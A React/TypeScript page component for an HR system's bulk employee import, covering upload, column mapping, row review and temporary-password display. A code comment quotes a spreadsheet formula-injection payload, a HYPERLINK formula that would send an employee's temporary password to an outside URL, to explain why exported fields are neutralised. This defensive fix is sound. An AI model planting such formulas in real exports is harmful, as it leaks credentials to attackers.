import {
  AlertTriangle,
  CheckCircle2,
  Download,
  FileSpreadsheet,
  History,
  KeyRound,
  ListChecks,
  Upload,
} from "lucide-react";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { getApiErrorMessage } from "../../api/axios";
import {
  confirmImport,
  downloadImportTemplate,
  getImportFields,
  getImportHistory,
  getImportRows,
  setImportMapping,
  uploadImportFile,
} from "../../api/importApi";
import Alert from "../../components/ui/Alert";
import Button from "../../components/ui/Button";
import Checkbox from "../../components/ui/Checkbox";
import DataTable from "../../components/ui/DataTable";
import EmptyState from "../../components/ui/EmptyState";
import FileDropzone from "../../components/ui/FileDropzone";
import FormField from "../../components/ui/FormField";
import PageHeader from "../../components/ui/PageHeader";
import Pagination from "../../components/ui/Pagination";
import PrimaryButton from "../../components/ui/PrimaryButton";
import RecordCard from "../../components/ui/RecordCard";
import SectionCard from "../../components/ui/SectionCard";
import SelectInput from "../../components/ui/SelectInput";
import StatusBadge from "../../components/ui/StatusBadge";
import Stepper, { type Step as StepDef } from "../../components/ui/Stepper";
import {
  classificationLabels,
  type ColumnMapping,
  type ImportCredential,
  type ImportFieldDescriptor,
  type ImportJob,
  type ImportOutcome,
  type ImportRow,
  type RowClassification,
  type UploadedFileAnalysis,
  type ValidationResult,
} from "../../types/import";
import { cn } from "../../utils/cn";
import { csvField } from "../../utils/csv";
import { formatDateTime } from "../../utils/datetime";

type Step = "upload" | "mapping" | "preview" | "done";

const ROWS_PER_PAGE = 10;

const classificationTone: Record<RowClassification, "success" | "info" | "neutral" | "warning" | "danger"> = {
  new: "success",
  update: "info",
  unchanged: "neutral",
  conflict: "warning",
  invalid: "danger",
};

const stepOrder: Array<{ id: Step; label: string }> = [
  { id: "upload", label: "Upload" },
  { id: "mapping", label: "Map columns" },
  { id: "preview", label: "Review" },
  { id: "done", label: "Summary" },
];

/**
 * The same four stages, described as what actually happens in each. Stage
 * three is where both the row classification and the options live, and
 * nothing is written until its confirmation - which is the one fact about this
 * workflow an administrator most needs to know.
 */
const STEPS: StepDef[] = [
  { id: "upload", label: "Upload", description: "CSV or Excel file" },
  { id: "mapping", label: "Map columns", description: "Match and validate" },
  { id: "preview", label: "Review and confirm", description: "Check every row, choose options" },
  { id: "done", label: "Result", description: "Created, updated, passwords" },
];

/** Solid dots for the outcome filters, matching each outcome's badge tone. */
const DOT: Record<"success" | "info" | "neutral" | "warning" | "danger" | "primary", string> = {
  success: "bg-success", info: "bg-info", neutral: "bg-fg-subtle",
  warning: "bg-warning", danger: "bg-danger", primary: "bg-primary",
};

/**
 * Builds a credentials CSV in the browser; the server never stores these.
 *
 * Every field goes through csvField, which neutralises formulas before quoting.
 * It used to quote only. Names and employee numbers come from the uploaded
 * file, and the same row carries a temporary password, so a crafted name such
 * as =HYPERLINK("https://..."&D2) could send that password elsewhere the
 * moment an administrator opened the file. Separately, generated passwords are
 * base64url and one in 64 begins with "-", which Excel read as a formula and
 * displayed as #NAME? - destroying the only copy of that employee's password.
 * The apostrophe marker fixes both, and is hidden by the spreadsheet.
 */
function downloadCredentials(credentials: ImportCredential[]): void {
  const csv = [
    "employee_number,full_name,email,temporary_password",
    ...credentials.map((credential) =>
      [credential.employee_number, credential.full_name, credential.email, credential.temporary_password]
        .map(csvField)
        .join(","),
    ),
  ].join("\r\n");

  const url = URL.createObjectURL(new Blob([csv], { type: "text/csv" }));
  const link = document.createElement("a");
  link.href = url;
  link.download = "hr-nexus-imported-credentials.csv";
  document.body.append(link);
  link.click();
  link.remove();
  URL.revokeObjectURL(url);
}

export default function ImportPage() {
  const [step, setStep] = useState<Step>("upload");
  const [error, setError] = useState("");
  const [isBusy, setIsBusy] = useState(false);

  const [fields, setFields] = useState<ImportFieldDescriptor[]>([]);
  const [analysis, setAnalysis] = useState<UploadedFileAnalysis | null>(null);
  const [mapping, setMapping] = useState<ColumnMapping>({});
  const [mappingErrors, setMappingErrors] = useState<string[]>([]);
  const [validation, setValidation] = useState<ValidationResult | null>(null);
  const [outcome, setOutcome] = useState<ImportOutcome | null>(null);

  const [rows, setRows] = useState<ImportRow[]>([]);
  const [rowTotal, setRowTotal] = useState(0);
  const [rowPage, setRowPage] = useState(1);
  const [rowFilter, setRowFilter] = useState<RowClassification | "">("");
  const [rowsLoading, setRowsLoading] = useState(false);

  const [applyUpdates, setApplyUpdates] = useState(false);
  const [createDepartments, setCreateDepartments] = useState(false);

  const [history, setHistory] = useState<ImportJob[]>([]);
  const [historyFailed, setHistoryFailed] = useState(false);

  const fileInput = useRef<HTMLInputElement>(null);

  const loadHistory = useCallback(async () => {
    try {
      setHistory((await getImportHistory(1, 10)).data);
      setHistoryFailed(false);
    } catch {
      setHistoryFailed(true);
    }
  }, []);

  useEffect(() => {
    void loadHistory();
    getImportFields().then(setFields).catch(() => setFields([]));
  }, [loadHistory]);

  const jobId = analysis?.job.id ?? null;

  const loadRows = useCallback(async () => {
    if (!jobId) return;
    try {
      setRowsLoading(true);
      const page = await getImportRows(jobId, {
        page: rowPage,
        pageSize: ROWS_PER_PAGE,
        classification: rowFilter,
      });
      setRows(page.data);
      setRowTotal(page.pagination.total);
      if (rowPage > page.pagination.page_count) setRowPage(page.pagination.page_count);
    } catch (requestError) {
      setError(getApiErrorMessage(requestError, "Unable to load the preview rows."));
    } finally {
      setRowsLoading(false);
    }
  }, [jobId, rowPage, rowFilter]);

  useEffect(() => {
    if (step === "preview") void loadRows();
  }, [step, loadRows]);

  function restart() {
    setStep("upload");
    setAnalysis(null);
    setMapping({});
    setMappingErrors([]);
    setValidation(null);
    setOutcome(null);
    setRows([]);
    setRowTotal(0);
    setRowPage(1);
    setRowFilter("");
    setApplyUpdates(false);
    setCreateDepartments(false);
    setError("");
    if (fileInput.current) fileInput.current.value = "";
  }

  async function handleUpload(file: File) {
    try {
      setIsBusy(true);
      setError("");
      setMappingErrors([]);
      const result = await uploadImportFile(file);
      setAnalysis(result);
      setMapping(result.suggested_mapping);
      setStep("mapping");
    } catch (requestError) {
      setError(getApiErrorMessage(requestError, "Unable to read that file."));
      if (fileInput.current) fileInput.current.value = "";
    } finally {
      setIsBusy(false);
    }
  }

  async function handleValidate() {
    if (!analysis) return;
    try {
      setIsBusy(true);
      setError("");
      setMappingErrors([]);
      const result = await setImportMapping(analysis.job.id, mapping);
      setValidation(result);
      setCreateDepartments(false);
      setApplyUpdates(false);
      setRowPage(1);
      setRowFilter("");
      setStep("preview");
    } catch (requestError) {
      const details = (requestError as { response?: { data?: { errors?: string[] } } })
        .response?.data?.errors;
      if (Array.isArray(details) && details.length > 0) {
        setMappingErrors(details);
      } else {
        setError(getApiErrorMessage(requestError, "Unable to validate the mapping."));
      }
    } finally {
      setIsBusy(false);
    }
  }

  async function handleConfirm() {
    if (!analysis) return;
    try {
      setIsBusy(true);
      setError("");
      const result = await confirmImport(analysis.job.id, {
        applyUpdates,
        createMissingDepartments: createDepartments,
      });
      setOutcome(result);
      setStep("done");
      void loadHistory();
    } catch (requestError) {
      setError(getApiErrorMessage(requestError, "The import failed and nothing was changed."));
      void loadHistory();
    } finally {
      setIsBusy(false);
    }
  }

  const summary = validation?.summary;
  const willCreate = summary?.new ?? 0;
  const willUpdate = applyUpdates ? (summary?.update ?? 0) : 0;
  const blocked = (summary?.invalid ?? 0) + (summary?.conflict ?? 0);
  const nothingToDo = willCreate === 0 && willUpdate === 0;

  const mappedColumns = useMemo(
    () => new Set(Object.values(mapping).filter((value): value is number => value !== undefined)),
    [mapping],
  );

  const currentStep = stepOrder.findIndex((entry) => entry.id === step);
  const requiredFields = fields.filter((field) => field.required);
  const requiredMapped = requiredFields.filter((field) => mapping[field.field] !== undefined).length;

  const historyTone = (status: string) =>
    status === "completed" ? "success" as const
      : status === "failed" ? "danger" as const
        : status === "ready" ? "info" as const : "neutral" as const;

  return (
    <section className="max-w-6xl space-y-6">
      <PageHeader
        title="Import workforce data"
        description="Bring an existing company's employees into HR Nexus from a CSV or Excel file."
        actions={
          <Button
            variant="secondary"
            icon={Download}
            onClick={() => {
              void downloadImportTemplate().catch((requestError) =>
                setError(getApiErrorMessage(requestError, "Unable to download the template.")),
              );
            }}
          >
            Download template
          </Button>
        }
      />

      {error && <Alert tone="danger" onDismiss={() => setError("")}>{error}</Alert>}

      {/* The real sequence, in the order the server enforces it: nothing is
          written until the fourth step's confirmation. */}
      <SectionCard>
        <Stepper steps={STEPS} current={step === "done" ? STEPS.length : currentStep} />
      </SectionCard>

      {step === "upload" && (
        <SectionCard
          title="Upload a file"
          description="Nothing is imported until you have reviewed every row and confirmed."
          icon={Upload}
        >
          <div className="space-y-4">
            <label htmlFor="import-file" className="sr-only">Workforce file</label>
            <FileDropzone
              id="import-file"
              ref={fileInput}
              accept=".csv,.xlsx"
              constraints="CSV or Excel (.xlsx), up to 5 MB and 5,000 rows. Columns are matched automatically."
              isBusy={isBusy}
              onFile={(file) => void handleUpload(file)}
            />

            <div className="flex items-start gap-2.5 rounded-xl bg-surface-muted p-4 text-sm text-fg-muted">
              <KeyRound size={16} className="mt-0.5 shrink-0 text-primary" aria-hidden="true" />
              <p>
                Passwords are never imported. Each new employee receives a generated
                temporary password, shown once when the import finishes, and must
                replace it on first sign-in.
              </p>
            </div>
          </div>
        </SectionCard>
      )}

      {step === "mapping" && analysis && (
        <SectionCard
          title="Map columns"
          description={`${analysis.job.file_name} · ${analysis.job.total_rows} data rows`}
          icon={ListChecks}
          actions={
            requiredFields.length > 0 ? (
              <StatusBadge
                label={`${requiredMapped} of ${requiredFields.length} required mapped`}
                tone={requiredMapped === requiredFields.length ? "success" : "warning"}
              />
            ) : undefined
          }
        >
          <div className="space-y-5">
            {mappingErrors.length > 0 && (
              <Alert tone="danger" title="Fix the mapping before continuing">
                <ul className="list-inside list-disc space-y-1">
                  {mappingErrors.map((message) => <li key={message}>{message}</li>)}
                </ul>
              </Alert>
            )}

            {analysis.ambiguous_fields.length > 0 && (
              <Alert tone="warning">
                More than one column matched{" "}
                {analysis.ambiguous_fields.join(", ")}. Check the selection below.
              </Alert>
            )}

            {analysis.ignored_password_headers.length > 0 && (
              <Alert tone="info">
                Ignoring credential column
                {analysis.ignored_password_headers.length === 1 ? "" : "s"}{" "}
                {analysis.ignored_password_headers.join(", ")}. Temporary passwords are
                generated by HR Nexus and never read from a file.
              </Alert>
            )}

            {analysis.unmatched_headers.length > 0 && (
              <Alert tone="info">
                These columns were not recognised and will not be imported:{" "}
                {analysis.unmatched_headers.join(", ")}.
              </Alert>
            )}

            <div className="grid gap-4 sm:grid-cols-2">
              {fields.map((field) => (
                <FormField
                  key={field.field}
                  id={`map-${field.field}`}
                  label={field.label}
                  required={field.required}
                >
                  <SelectInput
                    id={`map-${field.field}`}
                    value={mapping[field.field] === undefined ? "" : String(mapping[field.field])}
                    disabled={isBusy}
                    onChange={(event) =>
                      setMapping((current) => ({
                        ...current,
                        [field.field]: event.target.value === "" ? undefined : Number(event.target.value),
                      }))
                    }
                  >
                    <option value="">Not imported</option>
                    {analysis.headers.map((header, index) => (
                      <option key={`${header}-${index}`} value={index}>
                        {header || `Column ${index + 1}`}
                        {mappedColumns.has(index) && mapping[field.field] !== index ? " (already used)" : ""}
                      </option>
                    ))}
                  </SelectInput>
                </FormField>
              ))}
            </div>

            <div>
              <h3 className="mb-2 text-sm font-semibold text-fg">First rows of your file</h3>
              {/* Deliberately a raw scroll table rather than cards: its whole
                  purpose is to show the file's own columns side by side, so
                  they can be matched against the fields above. */}
              <div
                className="overflow-x-auto rounded-xl border border-line focus-visible:outline-2 focus-visible:outline-ring"
                tabIndex={0}
                role="group"
                aria-label="Sample rows from the uploaded file"
              >
                <table className="min-w-full text-left text-xs">
                  <thead className="bg-surface-muted text-fg-muted">
                    <tr>
                      {analysis.headers.map((header, index) => (
                        <th key={`${header}-${index}`} scope="col" className="whitespace-nowrap px-3 py-2 font-semibold">
                          {header || `Column ${index + 1}`}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-line">
                    {analysis.sample.map((row, rowIndex) => (
                      <tr key={rowIndex}>
                        {row.map((cell, cellIndex) => (
                          <td key={cellIndex} className="whitespace-nowrap px-3 py-2 text-fg-muted">
                            {cell || "—"}
                          </td>
                        ))}
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            <div className="flex flex-col-reverse gap-3 border-t border-line pt-5 sm:flex-row sm:justify-end">
              <Button variant="secondary" onClick={restart} disabled={isBusy}>
                Choose a different file
              </Button>
              <PrimaryButton
                onClick={() => void handleValidate()}
                isLoading={isBusy}
                loadingLabel="Validating..."
              >
                Validate rows
              </PrimaryButton>
            </div>
          </div>
        </SectionCard>
      )}

      {step === "preview" && summary && (
        <>
          <SectionCard
            title="What this file would do"
            description="Select an outcome to see only those rows."
            icon={CheckCircle2}
          >
            {/* Each count is also a filter. Pressing one shows exactly those
                rows in the preview below, which is the next thing anyone
                reading "3 invalid" wants to see. */}
            <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-6" role="group" aria-label="Filter rows by outcome">
              {([
                ["", "All rows", summary.total, "primary"],
                ["new", "New", summary.new, classificationTone.new],
                ["update", "Update", summary.update, classificationTone.update],
                ["unchanged", "Unchanged", summary.unchanged, classificationTone.unchanged],
                ["conflict", "Conflict", summary.conflict, classificationTone.conflict],
                ["invalid", "Invalid", summary.invalid, classificationTone.invalid],
              ] as const).map(([value, label, count, tone]) => {
                const isActive = rowFilter === value;
                return (
                  <button
                    key={label}
                    type="button"
                    aria-pressed={isActive}
                    onClick={() => { setRowFilter(value); setRowPage(1); }}
                    className={cn(
                      "rounded-xl border p-4 text-left transition-colors",
                      "focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-ring",
                      isActive ? "border-primary bg-primary-soft" : "border-line bg-surface-muted hover:border-control-border",
                    )}
                  >
                    <span className="flex items-center gap-2 text-xs font-medium text-fg-muted">
                      <span className={cn("h-2 w-2 rounded-full", DOT[tone])} aria-hidden="true" />
                      {label}
                    </span>
                    <span className="mt-2 block text-2xl font-bold tabular-nums text-fg">{count}</span>
                  </button>
                );
              })}
            </div>

            {summary.warnings > 0 && (
              <Alert tone="warning" className="mt-4">
                {summary.warnings} row{summary.warnings === 1 ? "" : "s"} have warnings. They
                will still be imported; review them below.
              </Alert>
            )}

            {blocked > 0 && (
              <Alert tone="info" className="mt-4">
                {blocked} row{blocked === 1 ? "" : "s"} cannot be imported and will be skipped.
                Nothing else in the file is affected by them.
              </Alert>
            )}
          </SectionCard>

          <SectionCard
            title="Row preview"
            description={`${rowTotal} ${rowTotal === 1 ? "row" : "rows"}${rowFilter ? ` · ${classificationLabels[rowFilter]}` : ""}`}
            icon={FileSpreadsheet}
            padded={false}
          >
            <DataTable
              plain
              headers={["Row", "Outcome", "Employee", "Details"]}
              caption="Rows in the uploaded file and what will happen to each"
              minWidthClass="min-w-200"
              isLoading={rowsLoading}
              loadingLabel="Loading rows"
              isEmpty={rows.length === 0}
              emptyState={
                <EmptyState
                  icon={FileSpreadsheet}
                  title="No rows with this outcome"
                  description="Choose a different outcome above to see more rows."
                />
              }
              mobileCards={rows.map((row) => {
                const data = (row.row_data ?? {}) as Record<string, string | null>;
                return (
                  <RecordCard
                    key={row.row_number}
                    title={data.full_name ?? "—"}
                    subtitle={`Row ${row.row_number} · ${data.employee_number ?? "no number"}`}
                    badge={
                      <StatusBadge
                        label={classificationLabels[row.classification]}
                        tone={classificationTone[row.classification]}
                      />
                    }
                    meta={
                      row.issues.length > 0
                        ? row.issues.slice(0, 2).map((issue, index) => ({
                            label: issue.level === "error" ? "Error" : `Warning ${index + 1}`,
                            value: issue.message,
                          }))
                        : row.changed_fields.length > 0
                          ? [{ label: "Changes", value: row.changed_fields.join(", ") }]
                          : undefined
                    }
                  />
                );
              })}
            >
              {rows.map((row) => {
                const data = (row.row_data ?? {}) as Record<string, string | null>;
                return (
                  <tr key={row.row_number}>
                    <td className="px-5 py-3 tabular-nums text-fg-muted">{row.row_number}</td>
                    <td className="px-5 py-3">
                      <StatusBadge
                        label={classificationLabels[row.classification]}
                        tone={classificationTone[row.classification]}
                        icon={row.classification === "invalid" || row.classification === "conflict"
                          ? AlertTriangle
                          : CheckCircle2}
                      />
                    </td>
                    <td className="px-5 py-3">
                      <p className="font-medium text-fg">{data.full_name ?? "—"}</p>
                      <p className="mt-0.5 text-xs text-fg-subtle">
                        {data.employee_number ?? "—"}
                        {data.email ? ` · ${data.email}` : ""}
                      </p>
                    </td>
                    <td className="px-5 py-3 text-sm">
                      {row.issues.length > 0 ? (
                        <ul className="space-y-1">
                          {row.issues.map((issue, index) => (
                            <li
                              key={index}
                              className={issue.level === "error" ? "text-danger-fg" : "text-warning-fg"}
                            >
                              {issue.message}
                            </li>
                          ))}
                        </ul>
                      ) : row.changed_fields.length > 0 ? (
                        <span className="text-fg-muted">
                          Changes: {row.changed_fields.join(", ")}
                        </span>
                      ) : (
                        <span className="text-fg-subtle">—</span>
                      )}
                    </td>
                  </tr>
                );
              })}
            </DataTable>

            <Pagination
              page={rowPage}
              pageSize={ROWS_PER_PAGE}
              totalItems={rowTotal}
              onPageChange={setRowPage}
            />
          </SectionCard>

          <SectionCard title="Options and confirmation" icon={Upload}>
            <div className="space-y-4">
              {summary.update > 0 && (
                <Checkbox
                  checked={applyUpdates}
                  disabled={isBusy}
                  onChange={(event) => setApplyUpdates(event.target.checked)}
                  label={`Update ${summary.update} existing employee${summary.update === 1 ? "" : "s"}`}
                  description="Without this, existing records are left exactly as they are."
                />
              )}

              {(validation?.missing_departments.length ?? 0) > 0 && (
                <Checkbox
                  checked={createDepartments}
                  disabled={isBusy}
                  onChange={(event) => setCreateDepartments(event.target.checked)}
                  label={`Create ${validation!.missing_departments.length} missing department${validation!.missing_departments.length === 1 ? "" : "s"}`}
                  description={`${validation!.missing_departments.join(", ")}. Rows referencing them stay invalid until the departments exist.`}
                />
              )}

              <div
                className={cn(
                  "rounded-xl p-4 text-sm",
                  nothingToDo && !createDepartments ? "bg-warning-soft text-warning-fg" : "bg-primary-soft text-fg",
                )}
                aria-live="polite"
              >
                {nothingToDo && !createDepartments
                  ? "Nothing in this file would be imported with the current options."
                  : (
                    <>
                      <span className="font-semibold">
                        {willCreate} employee{willCreate === 1 ? "" : "s"} will be created
                        {willUpdate > 0 ? ` and ${willUpdate} updated` : ""}.
                      </span>{" "}
                      This runs as a single transaction: it all applies, or none of it does.
                    </>
                  )}
              </div>

              <div className="flex flex-col-reverse gap-3 border-t border-line pt-4 sm:flex-row sm:justify-end">
                <Button variant="ghost" onClick={restart} disabled={isBusy}>
                  Cancel import
                </Button>
                <Button variant="secondary" onClick={() => setStep("mapping")} disabled={isBusy}>
                  Back to mapping
                </Button>
                <PrimaryButton
                  onClick={() => void handleConfirm()}
                  isLoading={isBusy}
                  loadingLabel="Importing..."
                  disabled={nothingToDo && !createDepartments}
                >
                  Import {willCreate + willUpdate} row{willCreate + willUpdate === 1 ? "" : "s"}
                </PrimaryButton>
              </div>
            </div>
          </SectionCard>
        </>
      )}

      {step === "done" && outcome && (
        <>
          <SectionCard>
            <div className="flex flex-col items-center gap-3 py-6 text-center">
              <span className="grid h-14 w-14 place-items-center rounded-full bg-success-soft text-success-fg" aria-hidden="true">
                <CheckCircle2 size={28} />
              </span>
              <h2 className="text-xl font-bold tracking-tight text-fg">Import complete</h2>
              <p className="max-w-md text-sm text-fg-muted" role="status">
                {outcome.created} employee{outcome.created === 1 ? "" : "s"} created
                {outcome.updated > 0 ? `, ${outcome.updated} updated` : ""}
                {outcome.created_departments.length > 0
                  ? `, ${outcome.created_departments.length} department${outcome.created_departments.length === 1 ? "" : "s"} created`
                  : ""}
                .
              </p>
              <PrimaryButton className="mt-2" onClick={restart}>Import another file</PrimaryButton>
            </div>
          </SectionCard>

          {outcome.credentials.length > 0 && (
            <SectionCard
              title="Temporary passwords"
              description="Shown once. Distribute them securely; HR Nexus does not store them."
              icon={KeyRound}
              padded={false}
              actions={
                <Button
                  variant="secondary"
                  size="sm"
                  icon={Download}
                  onClick={() => downloadCredentials(outcome.credentials)}
                >
                  Download CSV
                </Button>
              }
            >
              <div className="px-5 pt-5">
                <Alert tone="warning">
                  These passwords cannot be retrieved again. Download or copy them before
                  leaving this page. Each employee must replace theirs on first sign-in.
                </Alert>
              </div>
              <DataTable
                plain
                className="mt-4"
                headers={["Employee", "Email", "Temporary password"]}
                caption="Temporary passwords for the employees just created"
                mobileCards={outcome.credentials.map((credential) => (
                  <RecordCard
                    key={credential.employee_number}
                    title={credential.full_name}
                    subtitle={`${credential.employee_number} · ${credential.email}`}
                    meta={[{
                      label: "Temporary password",
                      value: <span className="font-mono text-fg">{credential.temporary_password}</span>,
                    }]}
                  />
                ))}
              >
                {outcome.credentials.map((credential) => (
                  <tr key={credential.employee_number}>
                    <td className="px-5 py-3">
                      <p className="font-medium text-fg">{credential.full_name}</p>
                      <p className="text-xs text-fg-subtle">{credential.employee_number}</p>
                    </td>
                    <td className="px-5 py-3 text-fg-muted">{credential.email}</td>
                    {/* Monospace here and only here: a password is the one value
                        where telling l from 1 and O from 0 matters. */}
                    <td className="px-5 py-3 font-mono text-sm text-fg">
                      {credential.temporary_password}
                    </td>
                  </tr>
                ))}
              </DataTable>
            </SectionCard>
          )}
        </>
      )}

      <SectionCard title="Import history" icon={History} padded={false}>
        {historyFailed ? (
          <div className="px-5 py-4">
            <Alert tone="warning">
              Import history could not be loaded. Imports themselves are unaffected.
            </Alert>
          </div>
        ) : (
          <DataTable
            plain
            headers={["File", "Status", <span key="rows" className="block text-right">Rows</span>, "Applied", "Started"]}
            caption="Previous import runs"
            minWidthClass="min-w-200"
            isEmpty={history.length === 0}
            emptyState={
              <EmptyState
                icon={History}
                title="No imports yet"
                description="Completed imports are recorded here for audit."
              />
            }
            mobileCards={history.map((job) => (
              <RecordCard
                key={job.id}
                leading={
                  <span className="grid h-10 w-10 place-items-center rounded-xl bg-primary-soft text-primary" aria-hidden="true">
                    <FileSpreadsheet size={18} />
                  </span>
                }
                title={job.file_name}
                subtitle={formatDateTime(job.created_at)}
                badge={
                  <StatusBadge
                    label={job.status.charAt(0).toUpperCase() + job.status.slice(1)}
                    tone={historyTone(job.status)}
                  />
                }
                meta={[
                  { label: "Rows", value: job.total_rows },
                  {
                    label: "Applied",
                    value: job.created_count + job.updated_count > 0
                      ? `${job.created_count} new, ${job.updated_count} updated`
                      : "—",
                  },
                ]}
              />
            ))}
          >
            {history.map((job) => (
              <tr key={job.id}>
                <td className="px-5 py-3">
                  <p className="font-medium text-fg">{job.file_name}</p>
                  <p className="mt-0.5 text-xs text-fg-subtle">
                    {job.initiated_by_email ?? "Unknown administrator"}
                  </p>
                </td>
                <td className="px-5 py-3">
                  <StatusBadge
                    label={job.status.charAt(0).toUpperCase() + job.status.slice(1)}
                    tone={historyTone(job.status)}
                    icon={job.status === "failed" ? AlertTriangle : CheckCircle2}
                  />
                  {job.error_message && (
                    <p className="mt-1 max-w-xs text-xs text-danger-fg">{job.error_message}</p>
                  )}
                </td>
                <td className="px-5 py-3 text-right tabular-nums text-fg-muted">{job.total_rows}</td>
                <td className="px-5 py-3 text-fg-muted">
                  {job.created_count + job.updated_count > 0
                    ? `${job.created_count} new, ${job.updated_count} updated`
                    : "—"}
                </td>
                <td className="px-5 py-3 text-fg-muted">{formatDateTime(job.created_at)}</td>
              </tr>
            ))}
          </DataTable>
        )}
      </SectionCard>
    </section>
  );
}
